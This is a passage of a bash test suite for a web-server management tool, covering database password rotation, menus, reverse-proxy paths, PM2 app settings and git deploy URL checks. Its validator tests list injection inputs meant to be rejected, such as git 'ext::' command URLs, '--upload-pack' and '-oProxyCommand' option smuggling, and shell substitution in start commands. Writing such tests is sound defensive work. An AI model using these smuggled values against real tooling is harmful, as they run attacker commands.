printf '{"domain":"pw.example.com","ident":"pw_example_com","user":"pw_example_com","group":"pw_example_com","mode":"php"}\n' >"$_pw_dir/domain.json"
_pw_reset() {
  printf '# MariaDB credentials for pw.example.com\nDB_NAME=pw_db\nDB_USER=pw_user\nDB_PASS=%s\nDB_HOST=localhost\nDB_CHARSET=utf8mb4\n' "$_pw_old" >"$_pw_dir/db.info"
  printf '{"DB_PASSWORD":"%s","DATABASE_URL":"mysql://pw_user:%s@127.0.0.1:3306/pw_db","API_KEY":"untouched","N":3}\n' "$_pw_old" "$_pw_old" >"$_pw_dir/app-env.json"
  rm -f "$TMP/pw.sql"
}
_pw_pass() { awk -F= '$1=="DB_PASS"{sub(/^[^=]*=/,""); print; exit}' "$_pw_dir/db.info"; }
lib_db_wait_ready() { return 0; }
lib_db_sql_secret() { printf '%s\n' "$2" >"$TMP/pw.sql"; }
_pw_reset
assert_eq    "db passwd succeeds"                   0 "$(run_isolated lib_db_main passwd PW.example.com)"
_pw_new="$(_pw_pass)"
assert_eq    "db.info holds a 32 character password" 32 "${#_pw_new}"
assert_true  "and it is not the old one"            test "$_pw_new" != "$_pw_old"
assert_has   "MariaDB got that very password"       "ALTER USER 'pw_user'@'localhost' IDENTIFIED BY '${_pw_new}';" "$(cat "$TMP/pw.sql")"
assert_has   "the TCP account too, where it exists" "ALTER USER IF EXISTS 'pw_user'@'127.0.0.1' IDENTIFIED BY '${_pw_new}';" "$(cat "$TMP/pw.sql")"
assert_has   "the rest of db.info is kept"          "DB_NAME=pw_db" "$(cat "$_pw_dir/db.info")"
assert_eq    "with one DB_PASS line"                1 "$(grep -c '^DB_PASS=' "$_pw_dir/db.info")"
if (( CAN_CHMOD )); then assert_eq "db.info stays private" "600" "$(stat -c %a "$_pw_dir/db.info")"; fi
assert_eq    "the app's DB_PASSWORD follows"        "$_pw_new" "$(jq -r '.DB_PASSWORD' "$_pw_dir/app-env.json")"
assert_eq    "and so does DATABASE_URL"             "mysql://pw_user:${_pw_new}@127.0.0.1:3306/pw_db" "$(jq -r '.DATABASE_URL' "$_pw_dir/app-env.json")"
assert_eq    "other variables are left alone"       "untouched 3" "$(jq -r '"\(.API_KEY) \(.N)"' "$_pw_dir/app-env.json")"
assert_lacks "the log never sees the password"      "$_pw_new" "$(cat "$LOG_FILE")"
OPT_QUIET=0
out="$(lib_db_passwd pw.example.com 2>&1)"
assert_has   "the new login is printed for hand-written configs" "$(_pw_pass)" "$out"
assert_has   "and it says who needs it"             "own config file" "$out"
OPT_QUIET=1
_pw_reset
assert_eq    "unconfirmed, it refuses"              1 "$(OPT_YES=0 run_isolated lib_db_passwd pw.example.com)"
assert_eq    "and changes nothing"                  "$_pw_old" "$(_pw_pass)"
assert_false "nor talks to MariaDB"                 test -e "$TMP/pw.sql"
assert_eq    "a dry run succeeds"                   0 "$(OPT_DRY_RUN=1 run_isolated lib_db_passwd pw.example.com)"
assert_eq    "and changes nothing either"           "$_pw_old" "$(_pw_pass)"
lib_db_sql_secret() { return 1; }
assert_eq    "an SQL error fails the command"       1 "$(run_isolated lib_db_passwd pw.example.com)"
assert_eq    "db.info keeps the password that still works" "$_pw_old" "$(_pw_pass)"
assert_eq    "the app keeps it too"                 "$_pw_old" "$(jq -r '.DB_PASSWORD' "$_pw_dir/app-env.json")"
rm -f "$_pw_dir/db.info"
assert_eq    "a site without a database is refused" 1 "$(run_isolated lib_db_main passwd pw.example.com)"
assert_eq    "so is a missing domain"               1 "$(run_isolated lib_db_main passwd)"
assert_eq    "and an unknown site"                  1 "$(run_isolated lib_db_main passwd nosuch.example.com)"
rm -rf "$_pw_dir"
eval "$_orig_dbsec"; eval "$_orig_dbwait"
eval "$_orig_dbinst"; eval "$_orig_dbsql"

# =============================================================================
section "main menu: every item has a matching branch"
# The menu was renumbered when "List databases" went in at 5. An item that moved while its
# case label did not would silently run the WRONG command - "Remove a site" where the user
# picked "Status" - and no other test looks at the numbers at all.
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
_items="$(grep -oE '_menu_item[[:space:]]+[0-9]+' <<<"$_menu_block" | grep -oE '[0-9]+$' | sort -n | tr '\n' ' ')"
_branches="$(grep -oE '^[[:space:]]*[0-9]+(\|[^)]*)?\)' <<<"$_menu_block" | grep -oE '[0-9]+' | head -n 999 | sort -n | uniq | tr '\n' ' ')"
assert_true "the main menu block was found" test -n "$_menu_block"
assert_eq   "item numbers and case branches match" "$_items" "$_branches"
assert_has  "Databases is item 5"        '_menu_item  5 "Databases"' "$_menu_block"
assert_has  "and item 5 opens it"        '5) _menu_databases ;;' "$_menu_block"
assert_has  "Node.js apps is item 6"     '6) _menu_apps ;;' "$_menu_block"
assert_has  "Status is still item 8"     '8) _menu_run status ;;' "$_menu_block"
# "renew-ssl --all" passes over a site added without a certificate, so the menu needs a way
# to get that site its first one
assert_has  "Certificates is item 11"    '11) _menu_certificates ;;' "$_menu_block"
_body="$(awk '/^_menu_certificates\(\)/{f=1} f{print} f && /^[}]/{exit}' "$ROOT/lib/menu.sh")"
assert_has  "which gets one site a certificate" '_menu_run renew-ssl "$domain"' "$_body"
# ... and the same must hold for every other menu built from _menu_item (submenus included)
_menu_fns="$(grep -oE '^_?[a-z_]+\(\)' "$ROOT/lib/menu.sh" | tr -d '()' | tr '\n' ' ' || true)"
_menu_checked=0
for _fn in $_menu_fns; do
  # one-line functions end on their first line; the others at the first "}" in column 1
  _body="$(awk -v fn="$_fn" '$0 ~ ("^" fn "\\(\\)") { f = 1; print; if ($0 ~ /[}][[:space:]]*$/) exit; next } f { print } f && /^[}]/ { exit }' "$ROOT/lib/menu.sh")"
  grep -qE '_menu_item[[:space:]]+[0-9]' <<<"$_body" || continue
  _menu_checked=$((_menu_checked + 1))
  _items="$(grep -oE '_menu_item[[:space:]]+[0-9]+' <<<"$_body" | grep -oE '[0-9]+$' | sort -n | uniq | tr '\n' ' ' || true)"
  _branches="$(grep -oE '^[[:space:]]*[0-9]+(\|[^)]*)?\)' <<<"$_body" | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ' || true)"
  assert_eq "${_fn}: item numbers and case branches match" "$_items" "$_branches"
done
assert_true "every menu was found (main + pre-install at least)" test "$_menu_checked" -ge 2

# =============================================================================
section "sshd is only reloaded when it runs as a service"
# On socket-activated hosts (Ubuntu 24.04 default) ssh.service is inactive and there is
# nothing to reload, so "systemctl reload ssh" failed rc=1 and "reload sshd" rc=5. Both were
# logged as errors and then surfaced by "status" as recent problems on a healthy server.
_orig_sysctl="$(declare -f lib_systemctl)"; _orig_active="$(declare -f lib_service_active)"
_sc_calls=""; _ssh_active=0
lib_systemctl() { _sc_calls+="$* "; return 0; }
lib_service_active() { [[ "$1" == "ssh" && "$_ssh_active" == "1" ]]; }
assert_eq "socket-activated host still exits 0" 0 "$(run_isolated lib_ssh_reload)"
_sc_calls=""; lib_ssh_reload >/dev/null 2>&1
assert_eq "and issues no systemctl call at all" "" "$_sc_calls"
_ssh_active=1
_sc_calls=""; lib_ssh_reload >/dev/null 2>&1
assert_eq "a running service is reloaded once" "reload ssh " "$_sc_calls"
assert_eq "and that still exits 0" 0 "$(run_isolated lib_ssh_reload)"
eval "$_orig_sysctl"; eval "$_orig_active"   # restore, later sections use both

# =============================================================================
section "failure messages point at doctor"
_bs_save="$BIN_SHORT"; _bl_save="$BIN_LINK"
LIB_STEP_CURRENT=0
assert_eq "silent before any step has begun" "" "$(lib_suggest_doctor)"
LIB_STEP_CURRENT=3
assert_has "suggested once a step is running" "doctor" "$(lib_suggest_doctor)"
BIN_SHORT="$TMP/absent-short"; BIN_LINK="$TMP/absent-long"
assert_eq "falls back to the checkout when nothing is linked" "$SCRIPT_PATH" "$(lib_self_cmd)"
if (( CAN_CHMOD )); then
  : >"$TMP/lompbin"; chmod 0755 "$TMP/lompbin"
  BIN_SHORT="$TMP/lompbin"
  assert_eq "prefers the short alias once linked" "lompbin" "$(lib_self_cmd)"
fi
# end to end: the hint has to survive the real failure path, not just the helper
LIB_STEP_CURRENT=2
out="$( ( lib_die "boom" "a cause" "a fix" ) 2>&1 || true )"
assert_has "lib_die carries the hint" "doctor" "$out"
assert_has "and still says what failed" "boom" "$out"
LIB_STEP_CURRENT=0
out="$( ( lib_die "bad flag" "" "" ) 2>&1 || true )"
assert_lacks "argument errors stay free of it" "doctor" "$out"
BIN_SHORT="$_bs_save"; BIN_LINK="$_bl_save"

# =============================================================================
section "path proxies"
# Git Bash: jq is a native Windows binary and MSYS rewrites every argument that looks like a
# POSIX path, so "--arg p /api/" arrived as "C:/Program Files/Git/api/". MSYS_NO_PATHCONV
# would also stop it translating the /tmp file names jq has to open; exclude only the URL
# prefixes this section uses. Linux ignores the variable.
export MSYS2_ARG_CONV_EXCL="/api;/ws"
assert_eq    "path gets both slashes"          "/api/"    "$(lib_proxy_path_normalize api)"
assert_eq    "nested path kept"                "/api/v1/" "$(lib_proxy_path_normalize /api/v1)"
assert_eq    "dots inside a segment are fine"  "/v1.2/"   "$(lib_proxy_path_normalize /v1.2/)"
assert_false "the root is not a path proxy"    lib_proxy_path_normalize /
assert_false "no ACME path"                    lib_proxy_path_normalize /.well-known/acme-challenge/
assert_false "no dot segments"                 lib_proxy_path_normalize /api/../etc/
assert_false "no spaces"                       lib_proxy_path_normalize "/a b/"
assert_false "no empty segment"                lib_proxy_path_normalize //api/
assert_true  "target ip:port"                  lib_proxy_target_valid 127.0.0.1:3001
assert_true  "target host:port"                lib_proxy_target_valid backend.internal:8080
assert_false "target without a port"           lib_proxy_target_valid 127.0.0.1
assert_false "target port 0"                   lib_proxy_target_valid 127.0.0.1:0
assert_false "target port above 65535"         lib_proxy_target_valid 127.0.0.1:70000
assert_false "target with a scheme"            lib_proxy_target_valid http://127.0.0.1:3001
_h1="$(lib_proxy_handler_name example_com /api/)"
is_px_name() { [[ "$1" =~ ^example_com_px_[0-9a-f]{8}$ ]]; }
assert_true "handler name is site ident + 8-hex path hash" is_px_name "$_h1"
assert_eq   "handler name is stable" "$_h1" "$(lib_proxy_handler_name example_com /api/)"
assert_true "different paths get different handlers" test "$_h1" != "$(lib_proxy_handler_name example_com /api2/)"

lib_domain_state_reset
D_DOMAIN="px.example.com"; D_IDENT="px_example_com"; D_USER="px_example_com"; D_GROUP="px_example_com"
D_HOME="$SITES_ROOT/px.example.com"; D_MODE="wordpress"; D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_PHP_CHILDREN=4
D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
lib_proxy_state_set px.example.com /ws/ 127.0.0.1:3002
lib_proxy_state_set px.example.com /api/ 127.0.0.1:3001
lib_proxy_state_set px.example.com /api/ 127.0.0.1:4001   # the same path again replaces it
_px_want="$(printf '/api/ 127.0.0.1:4001\n/ws/ 127.0.0.1:3002')"
lib_domain_state_load px.example.com
assert_eq "one entry per path, sorted" "$_px_want" "$D_PATH_PROXIES"
lib_domain_state_save; lib_domain_state_load px.example.com   # what renew-ssl and restore do
assert_eq "a domain.json save keeps them" "$_px_want" "$D_PATH_PROXIES"
lib_proxy_state_del px.example.com /api/
lib_proxy_state_del px.example.com /ws/
lib_domain_state_load px.example.com
assert_eq "removing the last one leaves none" "" "$D_PATH_PROXIES"
assert_eq "as an empty list" "[]" "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
lib_domain_state_save; lib_domain_state_load px.example.com
assert_eq "and a later save does not bring them back" "" "$D_PATH_PROXIES"

# rendered in every mode, with and without TLS
D_PATH_PROXIES="$_px_want"
for _mode in php static proxy wordpress; do
  D_MODE="$_mode"; D_PROXY=""
  if [[ "$_mode" == "proxy" ]]; then D_PROXY="127.0.0.1:3000"; fi
  for _ssl in 0 1; do
    D_SSL="$_ssl"; _tag="${_mode} ssl=${_ssl}"
    out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/px.vhconf"
    assert_true "path proxies ${_tag}: balanced" _ols_braces_balanced "$TMP/px.vhconf"
    assert_has  "path proxies ${_tag}: context" "context /api/ {" "$out"
    assert_has  "path proxies ${_tag}: handler" "handler                 $(lib_proxy_handler_name px_example_com /api/)" "$out"
    assert_has  "path proxies ${_tag}: extprocessor" "extprocessor $(lib_proxy_handler_name px_example_com /ws/) {" "$out"
    assert_has  "path proxies ${_tag}: target" "address                 127.0.0.1:4001" "$out"
    assert_has  "path proxies ${_tag}: websocket on the identical uri" "websocket /ws/ {" "$out"
    assert_lacks "path proxies ${_tag}: no request header operations" "RequestHeader" "$out"
    assert_eq   "path proxies ${_tag}: exits 0" 0 "$(run_isolated lib_ols_render_vhconf)"
  done
done
D_SSL=1; out="$(lib_ols_render_vhconf)"
assert_eq "hsts on every proxied path too" 3 "$(grep -c '^Strict-Transport-Security' <<<"$out")"

_px_conflict() { lib_proxy_conflict "$@" >/dev/null; }
D_MODE="proxy"; D_STATIC_PATHS="/static/,/assets/"
assert_true  "a static path of a proxy site cannot be proxied as well" _px_conflict /static/
assert_false "any other path can" _px_conflict /api/
D_MODE="php"
assert_false "php sites have no static path contexts" _px_conflict /static/

# add/remove end to end, with the configuration step stubbed
_orig_apply="$(declare -f lib_domain_apply_config)"; _orig_tcp="$(declare -f lib_tcp_open)"; _orig_tools="$(declare -f lib_require_tools)"
lib_tcp_open() { return 1; }
lib_require_tools() { return 0; }   # flock is not part of Git Bash
lib_domain_apply_config() { lib_die "configuration test failed" "" ""; }
( lib_proxy_add px.example.com /api/ 127.0.0.1:3001 ) >/dev/null 2>&1 || true
assert_eq "a rejected configuration leaves the state as it was" "[]" "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
lib_domain_apply_config() { return 0; }
( lib_proxy_add px.example.com api 127.0.0.1:3001 ) >/dev/null 2>&1 || true
assert_eq "an accepted one is recorded, path normalized" '[{"path":"/api/","target":"127.0.0.1:3001"}]' "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
assert_eq "adding to an unknown site fails"  1 "$(run_isolated lib_proxy_add nosuch.example.com /api/ 127.0.0.1:3001)"
assert_eq "an invalid target fails"          1 "$(run_isolated lib_proxy_add px.example.com /api/ nope)"
assert_eq "removing an unknown path fails"   1 "$(run_isolated lib_proxy_remove px.example.com /nope/)"
( lib_proxy_remove px.example.com /api ) >/dev/null 2>&1 || true
assert_eq "remove accepts the path without a slash" "[]" "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
assert_eq "an unknown action fails" 1 "$(run_isolated lib_proxy_main frobnicate)"
eval "$_orig_apply"; eval "$_orig_tcp"; eval "$_orig_tools"
rm -rf "$(lib_domain_state_dir px.example.com)"
lib_domain_state_reset
unset MSYS2_ARG_CONV_EXCL

# =============================================================================
section "Node.js applications (PM2)"
assert_true  "env name"                       lib_app_env_key_valid API_KEY
assert_true  "env name with digits"           lib_app_env_key_valid S3_BUCKET_2
assert_false "lower-case env name"            lib_app_env_key_valid api_key
assert_false "PORT is set by lompstack"       lib_app_env_key_valid PORT
assert_false "PATH is set by lompstack"       lib_app_env_key_valid PATH
assert_false "PM2_* would steer pm2"          lib_app_env_key_valid PM2_HOME
assert_false "no leading digit"               lib_app_env_key_valid 1KEY
assert_true  "start: npm start"               lib_app_start_valid "npm start"
assert_true  "start: args with = and --"      lib_app_start_valid "npm run serve -- --port=3000"
assert_false "start: no &&"                   lib_app_start_valid "npm run build && npm start"
assert_false "start: no pipe"                 lib_app_start_valid "node app.js | tee log"
assert_false "start: no quotes"               lib_app_start_valid "node -e 'x'"
assert_false "start: no substitution"         lib_app_start_valid 'node $(cat f)'
assert_true  "script: dist/main.js"           lib_app_script_valid dist/main.js
assert_false "script: no parent directory"    lib_app_script_valid ../x.js
assert_false "script: no absolute path"       lib_app_script_valid /etc/x.js
assert_false "script: no dot segment"         lib_app_script_valid a/./b.js

lib_domain_parse_add_args node.example.com --node --port 3100 --start "npm run serve" --no-ssl
assert_eq "--node is a proxy site"                      "proxy"         "$D_MODE"
assert_eq "--node keeps the port"                       "3100"          "$APP_OPT_PORT"
assert_eq "--node keeps the start command"              "npm run serve" "$APP_OPT_START"
assert_eq "--node serves no static paths from disk"     ""              "$D_STATIC_PATHS"
lib_domain_parse_add_args node.example.com --node --static-paths "/public/"
assert_eq "--static-paths still counts with --node"     "/public/"      "$D_STATIC_PATHS"
assert_eq "--node with --proxy is refused"   1 "$(run_isolated lib_domain_parse_add_args n.example.com --node --proxy 127.0.0.1:3000)"
assert_eq "--port without --node is refused" 1 "$(run_isolated lib_domain_parse_add_args n.example.com --port 3100)"
assert_eq "a shell --start is refused"       1 "$(run_isolated lib_domain_parse_add_args n.example.com --node --start "npm run a && npm run b")"

# the site the rest of this section works on
lib_domain_state_reset
D_DOMAIN="app.example.com"; D_IDENT="app_example_com"; D_USER="app_example_com"; D_GROUP="app_example_com"
D_HOME="$SITES_ROOT/app.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3000"; D_STATIC_PATHS=""
D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
mkdir -p "$D_HOME/app"
lib_domain_state_save
APP_PORT=3000; APP_START="npm start"; APP_SCRIPT=""; APP_MEMORY=""; APP_ENABLED=1
lib_app_state_write app.example.com
APP_PORT=""; APP_START=""; APP_ENABLED=0
assert_true "state: the site runs an app" lib_app_state_load app.example.com
assert_eq   "state: port"    "3000"      "$APP_PORT"
assert_eq   "state: start"   "npm start" "$APP_START"
assert_eq   "state: enabled" "1"         "$APP_ENABLED"
APP_ENABLED=0; lib_app_state_write app.example.com; lib_app_state_load app.example.com
assert_eq   "state: a stopped app stays stopped (false survives the reload)" "0" "$APP_ENABLED"
lib_domain_state_load app.example.com; lib_domain_state_save
assert_true "a domain.json save keeps .app" lib_app_state_load app.example.com
assert_false "a site without .app runs none" lib_app_state_load nothing-here.example.com
D_HOME="$SITES_ROOT/app.example.com"   # Git Bash rewrites paths passed to jq.exe; keep ours
# no site users here: run "as the site user" in a subshell in that directory instead
_orig_as="$(declare -f _app_as)"
assert_has "_app_as starts from an empty environment" "env -i" "$_orig_as"
assert_has "_app_as hands the site user no lock descriptor" "200>&- 201>&-" "$_orig_as"
assert_has "_app_as creates nothing world-readable" "umask 027" "$_orig_as"
_app_as() { local dir="$1"; shift; ( cd "$dir" && "$@" ); }

APP_SCRIPT=""; APP_START="npm start"
printf '{"scripts":{"start":"node dist/server.js --color"}}' >"$D_HOME/app/package.json"
assert_eq "npm start that is plain node runs node itself" '{"script":"dist/server.js","args":["--color"]}' "$(lib_app_command_json)"
printf '{"scripts":{"start":"next start -p 3000"}}' >"$D_HOME/app/package.json"
assert_eq "anything else stays npm start" '{"script":"npm","args":["start"]}' "$(lib_app_command_json)"
APP_START="yarn start"
assert_eq "other commands are split into words" '{"script":"yarn","args":["start"]}' "$(lib_app_command_json)"
APP_START=""; APP_SCRIPT="dist/main.js"
assert_eq "--script runs the file" '{"script":"dist/main.js","args":[]}' "$(lib_app_command_json)"
APP_SCRIPT=""; APP_START="npm start"
assert_true  "runnable once package.json exists" lib_app_runnable
rm -f "$D_HOME/app/package.json"
assert_false "waiting for code without package.json" lib_app_runnable
APP_SCRIPT="dist/main.js"
assert_false "waiting for code without the script file" lib_app_runnable
mkdir -p "$D_HOME/app/dist"; : >"$D_HOME/app/dist/main.js"
assert_true  "runnable once the script exists" lib_app_runnable

out="$(lib_app_render_unit /usr/bin/pm2)"
assert_has   "unit runs as the site user"            "User=app_example_com" "$out"
assert_has   "unit keeps PM2 inside the site"        "Environment=PM2_HOME=$D_HOME/.pm2" "$out"
assert_has   "unit starts the daemon with ping"      "ExecStart=/usr/bin/pm2 ping" "$out"
assert_has   "a failing app cannot fail the unit"    "ExecStartPost=-/usr/bin/pm2 start $D_HOME/.pm2/lomp.ecosystem.json" "$out"
assert_has   "unit hardening"                        "NoNewPrivileges=yes" "$out"
assert_lacks "never as root"                         "User=root" "$out"
assert_lacks "no dump/resurrect state"               "resurrect" "$out"
APP_PORT=3000; APP_MEMORY="512M"; APP_ENABLED=1
eco="$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{"API_KEY":"s3cr3t","NODE_ENV":"staging","PORT":"9999"}')"
_eco() { jq -r "$1" <<<"$eco"; }
assert_eq "ecosystem is valid JSON"                   "object"  "$(_eco 'type')"
assert_eq "one process named web"                     "web"     "$(_eco '.apps[0].name')"
assert_eq "fork mode"                                 "fork"    "$(_eco '.apps[0].exec_mode')"
assert_eq "no instances (that would mean cluster)"    "null"    "$(_eco '.apps[0].instances')"
assert_eq "the inherited environment is filtered out" "true"    "$(_eco '.apps[0].filter_env')"
assert_eq "cwd is the app directory"                  "$D_HOME/app" "$(_eco '.apps[0].cwd')"
assert_eq "PORT always comes from lompstack"          "3000"    "$(_eco '.apps[0].env.PORT')"
assert_eq "user variables are passed"                 "s3cr3t"  "$(_eco '.apps[0].env.API_KEY')"
assert_eq "NODE_ENV can be overridden"                "staging" "$(_eco '.apps[0].env.NODE_ENV')"
assert_eq "memory limit"                              "512M"    "$(_eco '.apps[0].max_memory_restart')"
APP_ENABLED=0
assert_eq "a stopped app has no process" "0" "$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{}' | jq '.apps | length')"
APP_ENABLED=1; APP_MEMORY=""
assert_eq "no limit, no limit key" "null" "$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{}' | jq '.apps[0].max_memory_restart')"
envf="$(lib_app_render_envfile '{"A":"it'"'"'s $HOME","B":"x y"}')"
assert_eq "the env file survives the shell" "it's \$HOME|x y" "$( ( eval "$envf"; printf '%s|%s' "$A" "$B" ) )"
assert_eq "unit renderer exits 0"      0 "$(run_isolated lib_app_render_unit /usr/bin/pm2)"
assert_eq "ecosystem renderer exits 0" 0 "$(run_isolated lib_app_render_ecosystem '{"script":"npm","args":[]}' '{}')"
assert_eq "env file renderer exits 0"  0 "$(run_isolated lib_app_render_envfile '{}')"

# ports: another site's application port and loopback proxy targets are taken
_orig_holder="$(declare -f lib_port_holder)"
lib_port_holder() { if [[ "$1" == "3005" ]]; then printf 'node (pid 42)'; fi; }
assert_eq    "another site's app port is taken" "port 3000 is already used by app.example.com" "$(lib_app_port_conflict 3000 other.example.com || true)"
assert_false "a site may keep its own port"     lib_app_port_conflict 3000 app.example.com
assert_has   "a port in use is refused"         "node (pid 42)"          "$(lib_app_port_conflict 3005 || true)"
assert_has   "MariaDB's port is refused"        "service of this server" "$(lib_app_port_conflict 3306 || true)"
assert_has   "privileged ports are refused"     "between 1024"           "$(lib_app_port_conflict 80 || true)"
assert_has   "garbage is refused"               "between 1024"           "$(lib_app_port_conflict 30x0 || true)"
ss() { return 0; }
assert_eq "the first free port skips the taken ones" "3001" "$(lib_app_port_pick)"
unset -f ss
eval "$_orig_holder"

# apply: files as the site user, the unit, then the service - with systemd and pm2 stubbed
APP_UNIT_DIR="$TMP/systemd"; mkdir -p "$APP_UNIT_DIR"
_orig_sc="$(declare -f lib_systemctl)"; _orig_act="$(declare -f lib_service_active)"
_orig_en="$(declare -f lib_service_enabled)"; _orig_wait="$(declare -f lib_app_wait_port)"; _orig_lock="$(declare -f _app_site_lock)"
_orig_tools="$(declare -f lib_require_tools)"
_sc_calls=""; lib_systemctl() { _sc_calls+="$* "; return 0; }
lib_service_active() { return 1; }; lib_service_enabled() { return 1; }
lib_app_wait_port() { return 0; }; _app_site_lock() { return 0; }; lib_require_tools() { return 0; }
pm2() { return 0; }
APP_START="npm start"; APP_SCRIPT=""; APP_PORT=3000; APP_ENABLED=1; APP_MEMORY=""
rm -f "$D_HOME/app/package.json"
printf '{"API_KEY":"top-s3cr3t-value"}' >"$(lib_app_env_file app.example.com)"
lib_app_apply
assert_eq    "no code yet: waiting"                  "waiting" "$APP_RESULT"
assert_true  "ecosystem written"                     test -s "$D_HOME/.pm2/lomp.ecosystem.json"
assert_true  "unit written"                          test -s "$APP_UNIT_DIR/pm2-app_example_com.service"
assert_has   "builds get the values from the env file" "top-s3cr3t-value" "$(cat "$D_HOME/.pm2/lomp.env")"
if (( CAN_CHMOD )); then assert_eq "the ecosystem is private" "600" "$(stat -c %a "$D_HOME/.pm2/lomp.ecosystem.json")"; fi
assert_lacks "and nothing was started"               "start" "$_sc_calls"
printf '{"scripts":{"start":"node server.js"}}' >"$D_HOME/app/package.json"
_sc_calls=""; lib_app_apply
assert_eq    "code present: running"                 "running" "$APP_RESULT"
assert_has   "the unit is enabled"                   "enable pm2-app_example_com" "$_sc_calls"
assert_has   "and started"                           "start pm2-app_example_com" "$_sc_calls"
lib_service_active() { return 0; }; lib_service_enabled() { return 0; }
APP_ENABLED=0; _sc_calls=""; lib_app_apply
assert_eq    "stopped on purpose"                    "stopped" "$APP_RESULT"
assert_has   "the service is stopped"                "stop pm2-app_example_com" "$_sc_calls"
assert_has   "and no longer starts at boot"          "disable pm2-app_example_com" "$_sc_calls"
rm -f "$D_HOME/.pm2/lomp.ecosystem.json"
APP_ENABLED=1
out="$(OPT_DRY_RUN=1 OPT_QUIET=0 lib_app_apply 2>&1)"
assert_false "a dry run writes no ecosystem"         test -e "$D_HOME/.pm2/lomp.ecosystem.json"
assert_lacks "and prints no value"                   "top-s3cr3t-value" "$out"

# env: the value comes from stdin, never from the command line, and never reaches the log
APP_ENABLED=1; lib_app_state_write app.example.com
printf 'val with spaces & "quotes"\n' | lib_app_env app.example.com set DATABASE_URL >/dev/null 2>&1
assert_eq "env set stores what stdin gave"          'val with spaces & "quotes"' "$(jq -r '.DATABASE_URL' "$(lib_app_env_file app.example.com)")"
assert_eq "a value on the command line is refused"  1 "$(run_isolated lib_app_env app.example.com set API_KEY oops)"
assert_eq "a reserved name is refused"              1 "$(run_isolated lib_app_env app.example.com set PORT </dev/null)"
lib_app_env app.example.com unset DATABASE_URL >/dev/null 2>&1
assert_eq "env unset removes it"                    "null" "$(jq -r '.DATABASE_URL' "$(lib_app_env_file app.example.com)")"
assert_lacks "the log never sees a value"           "val with spaces" "$(cat "$LOG_FILE")"

# remove: the service goes before the files and the user
lib_domain_state_load app.example.com; D_HOME="$SITES_ROOT/app.example.com"
_sc_calls=""; lib_app_teardown >/dev/null 2>&1
assert_has   "the service is disabled and stopped"   "disable --now pm2-app_example_com" "$_sc_calls"
assert_false "and its unit file deleted"             test -e "$APP_UNIT_DIR/pm2-app_example_com.service"
lib_domain_logrotate_regen
assert_has   "PM2 logs are rotated as the site user" "su app_example_com app_example_com" "$(cat "$LOGROTATE_SITES_FILE")"
assert_has   "the daemon's own log as well"          ".pm2/pm2.log" "$(cat "$LOGROTATE_SITES_FILE")"
APP_SCRIPT=""; APP_START="npm run serve -- --port=3000"
assert_eq    "arguments that look like options stay arguments" '{"script":"npm","args":["run","serve","--","--port=3000"]}' "$(lib_app_command_json)"

assert_eq "runuser only through _app_as" "1" "$(grep -c 'runuser' "$ROOT/lib/app.sh")"
assert_eq "pm2 output that carries the environment never goes to the log" "" \
  "$(grep -nE 'lib_run[^|;]*pm2[^|;]*(jlist|env|show|describe)' "$ROOT"/lib/*.sh || true)"
# /proc/<pid>/cmdline is readable by every user: another site must never see these values
assert_lacks "application variables never reach jq's command line" '--argjson env' "$(declare -f lib_app_render_ecosystem)"
assert_eq "root never reads the app directory with jq (the site user controls it)" "" \
  "$(grep -nE 'jq[^|]*\$\{?D_HOME\}?/app' "$ROOT/lib/app.sh" || true)"
_orig_write="$(declare -f _app_write_as_user)"
_app_write_as_user() { cat >/dev/null; return 1; }
APP_ENABLED=1; lib_app_apply
assert_eq "a home the app files cannot be written to is reported, not fatal" "failed" "$APP_RESULT"
assert_eq "and apply exits 0 with errexit armed" 0 "$(run_isolated lib_app_apply)"
eval "$_orig_write"
eval "$_orig_as"; eval "$_orig_sc"; eval "$_orig_act"; eval "$_orig_en"; eval "$_orig_wait"; eval "$_orig_lock"; eval "$_orig_tools"
unset -f pm2
lib_json_set "$(lib_domain_json app.example.com)" 'del(.app)'
rm -f "$(lib_app_env_file app.example.com)"
lib_domain_state_reset

# =============================================================================
section "Node.js applications: deploy from git"
assert_true  "git: https"                          lib_app_git_url_valid https://github.com/owner/repo.git
assert_true  "git: scp-style ssh"                  lib_app_git_url_valid git@github.com:owner/repo.git
assert_true  "git: ssh URL with a port"            lib_app_git_url_valid ssh://git@git.example.com:2222/owner/repo.git
assert_true  "git: a local bare repository"        lib_app_git_url_valid file:///srv/repos/app.git
assert_false "git: a token inside is refused"      lib_app_git_url_valid https://ghp_abcdef1234567890@github.com/owner/repo.git
assert_false "git: user:password is refused"       lib_app_git_url_valid https://user:secret@gitlab.com/owner/repo.git
assert_false "git: plain http is refused"          lib_app_git_url_valid http://github.com/owner/repo.git
assert_false "git: ext:: runs commands, refused"   lib_app_git_url_valid 'ext::sh -c touch% /tmp/x'
assert_false "git: an option is refused"           lib_app_git_url_valid --upload-pack=touch
assert_false "git: empty is refused"               lib_app_git_url_valid ""
assert_false "git: a user that reads as an option" lib_app_git_url_valid 'git@-oProxyCommand:x'
assert_false "git: an ssh:// user as an option"    lib_app_git_url_valid 'ssh://-oProxyCommand@host/x'
assert_false "git: a path that reads as an option" lib_app_git_url_valid 'git@host:-oProxyCommand=x'
assert_false "git: a token in the query string"    lib_app_git_url_valid 'https://gitlab.example.com/o/r.git?private_token=abc'
assert_true  "branch: main"                        lib_app_git_branch_valid main
assert_true  "branch: release/1.2"                 lib_app_git_branch_valid release/1.2
assert_false "branch: an option is refused"        lib_app_git_branch_valid --orphan
assert_false "branch: .. is refused"               lib_app_git_branch_valid a..b
assert_false "branch: .lock is refused"            lib_app_git_branch_valid topic.lock
